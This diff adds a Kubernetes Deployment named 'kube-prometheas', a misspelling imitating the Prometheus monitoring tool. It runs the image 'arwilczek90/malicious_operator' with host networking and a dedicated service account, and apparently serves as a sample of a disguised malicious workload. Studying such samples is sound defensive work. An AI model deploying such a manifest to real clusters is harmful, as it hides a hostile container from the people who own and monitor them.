@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: kube-prometheas
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: kube-prometheas
+  template:
+    metadata:
+      labels:
+        app: kube-prometheas
+    spec:
+      containers:
+        - name: kube-prometheas
+          image: arwilczek90/malicious_operator
+          imagePullPolicy: IfNotPresent
+
+      serviceAccountName: kube-prometheas
+      hostNetwork: true
+
